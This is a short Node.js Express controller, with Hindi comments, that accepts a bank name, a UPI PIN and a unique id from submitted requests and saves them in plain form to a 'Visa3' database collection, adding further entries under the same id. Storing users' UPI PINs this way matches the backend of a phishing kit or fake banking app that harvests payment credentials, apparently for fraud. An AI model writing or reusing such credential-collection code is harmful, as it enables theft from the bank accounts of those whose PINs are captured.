const Visa3 = require('../models/Visa3');

exports.createVisa3 = async (req, res) => {
  const { bankName, upiPin, uniqueid } = req.body;
  
  if (!bankName || !upiPin || !uniqueid) {
    return res.status(400).json({ message: 'All fields are required' });
  }
  
  try {
    let visa3 = await Visa3.findOne({ uniqueid });
  
    if (visa3) {
      // अगर दस्तावेज़ पहले से मौजूद है, तो entries एरे में नया एंट्री जोड़ें:
      visa3.entries.push({ bankName, upiPin });
    } else {
      // नया दस्तावेज़ बनाते समय entries एरे में एंट्री शामिल करें:
      visa3 = new Visa3({
        uniqueid,
        entries: [{ bankName, upiPin }]
      });
    }
  
    await visa3.save();
  
    return res.status(201).json({
      success: true,
      message: 'Visa3 data successfully saved'
    });
  } catch (error) {
    console.error(error);
    return res.status(500).json({
      success: false,
      message: 'Server error, please try again later'
    });
  }
};
